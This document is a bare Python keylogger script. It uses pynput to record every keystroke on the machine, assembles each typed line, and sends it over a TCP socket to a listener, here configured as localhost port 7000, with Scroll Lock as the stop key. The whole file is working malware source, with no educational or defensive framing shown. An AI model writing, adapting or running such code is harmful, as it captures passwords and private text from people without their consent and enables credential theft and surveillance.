import socket
from pynput.keyboard import Key, Listener 
import socket

host = "localhost"
port = 7000  


chars = []

def make_str(): 
    STRIN = ""
    for i in range(0,len(chars)): 
        STRIN += str(chars[i])
    return STRIN 


    
def process_char(c):
    if(len(chars)!=0 and c == Key.backspace):
        chars.pop()
    elif(c==Key.space): 
        chars.append(" ") 
    elif(c==Key.up or c==Key.down or c == Key.left or c== Key.right or c== Key.ctrl_r or c == Key.alt_l or c == Key.cmd or c == Key.ctrl_l or c == Key.shift_r ): 
        pass
    elif(c== Key.enter): 
        str_r = make_str()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

            sock.connect((host, port))
            sock.sendall(bytes(str_r, "utf-8"))

            received = str(sock.recv(1024), "utf-8")

        chars.clear()
        

    else : 
        chars.append(c)

def on_press(key): 
   #print(f"[{key}]")    
   process_char(key)
   
  

def on_release(key): 
    if key == Key.scroll_lock: 
        
        return False
        
with Listener (on_press = on_press , on_release = on_release) as listener: 
    listener.join()



